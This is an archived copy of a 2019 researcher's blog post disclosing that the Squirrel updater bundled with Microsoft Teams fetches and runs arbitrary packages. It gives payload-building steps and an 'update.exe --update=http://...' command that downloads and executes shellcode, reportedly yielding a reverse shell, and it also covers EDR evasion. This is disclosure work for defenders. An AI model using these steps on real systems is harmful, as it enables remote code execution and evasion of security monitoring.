---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-28_nugetsquirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution.md
original_filename: 2019-06-28_nugetsquirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution.md
title: Nuget/Squirrel uncontrolled endpoints leads to arbitrary code execution
category: documents
detected_topics:
- access-control
- command-injection
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- access-control
- command-injection
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 99fd1d509557888c341390d623e4a3ac02b979e4e0d472f26c13bf352d384350
text_sha256: 2b318cf810b83bb3ce52f1387e526cc198bb13a38cd9a8e16c69b09ef65de9b6
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Nuget/Squirrel uncontrolled endpoints leads to arbitrary code execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-28_nugetsquirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `99fd1d509557888c341390d623e4a3ac02b979e4e0d472f26c13bf352d384350`
- Text SHA256: `2b318cf810b83bb3ce52f1387e526cc198bb13a38cd9a8e16c69b09ef65de9b6`


## Content

---
title: "Nuget/Squirrel uncontrolled endpoints leads to arbitrary code execution"
url: "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12"
authors: ["Reegun J (@reegun21)"]
programs: ["Microsoft"]
bugs: ["RCE"]
publication_date: "2019-06-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5178
scraped_via: "browseros"
---

# Nuget/Squirrel uncontrolled endpoints leads to arbitrary code execution

Nuget/Squirrel uncontrolled endpoints leads to arbitrary code execution
Reegun J
Follow
3 min read
·
Jun 28, 2019

152

3

Update :2-July-2019

https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56

When i was researching Microsoft ‘Teams,’ I came across an interesting argument ‘update’, I got to know from Squirrel documentation that this command will download and execute the respective Nuget package automatically, I was like why Microsoft has this feature? can i exploit this?

The Package creation was bit challenging one, It took some hours to figure out how easy it is, Then i tried to create a reverse shell , tried the update command from Microsoft Teams and voila! I got a reverse shell.

I reported to Microsoft and they are not bad, they responded to me and validated the vulnerable endpoint and postponed the fix to future release, I was waiting for the fix so i can make it release publicly.

But, Of-course most of them hunting for the exploits and doing good for the community to protect from adversaries, I got an update in my Twitter that another researcher https://twitter.com/MrUn1k0d3r released similar vulnerable endpoint in Microsoft Teams that also from ‘update.exe’ , Got an update that https://twitter.com/Hexacorn also researched about Squirrel packages initially , The both researchers did a fantastic work on this, So i decided finally to make it public since i spent most of the time in this and without fixing this, the adversaries/insiders likely use this technique for EDR/IDS evasion, So this post will make the blueteam-defense team aware of this situation.

Vulnerable Endpoints :

%localappdata%/Microsoft/Teams/update.exe

%localappdata%/Microsoft/Teams/current/squirrel.exe

Payload creation :

Payload preparation:

extract any nupkg package, in my example Exploit-1.5.60-full.nupkg
goto Exploit-1.5.60-full\lib\net45 and drop your shellcode as ‘squirrel.exe’
compress the complete folder as ‘Exploit-1.5.60-full.nupkg’
Calculate the metadata with below command.
sha1sum Exploit-1.5.60-full.nupkg && wc -c < Exploit-1.5.60-full.nupkg
Output : fa8b87f0b995498a6e890c832dcaf968997608d4 Exploit-1.5.60-full.nupkg 4695
create a file named RELEASES and copy the above output and save.
So the main directory contains 2 file Exploit-1.5.60-full.nupkg and RELEASES.
upload to any http server.

How to attack :

Download and execute:

Step 1: Go to target application folder, So go to “%localappdata%[application Folder]”
Step 2: Run the below command,
update.exe — update=[http server contains the above 2 files]
E.g update.exe — update=http://192.168.10.251/

Get Reegun J’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now the update command will download the malicious package and install automatically.

2. Download :

Press enter or click to view image in full size

update.exe — download=[http server contains the above 2 files]

It will download the package containing shellcode to “packages” folder.

What is the impact?

Malicious code execution from Microsoft legitimate binary (Living off the Land)
No special privilege required, just a standard windows user can able to exploit this.
RedTeam/Insiders will use this evade EDR/IDS.
Privilege escalation happens, if the application has control of SYSTEM files.

What is the Issue?

There is no controlled design that application to update from authenticated URL.
Allowing 3rd party url to download the package.
I would not say the issue with Squirrel application design, but Developers might redact the unwanted arguments and push automatic updates.

LOLBAS/LOLBINS contributions:

update | LOLBAS
Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

lolbas-project.github.io

squirrel | LOLBAS
Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

lolbas-project.github.io
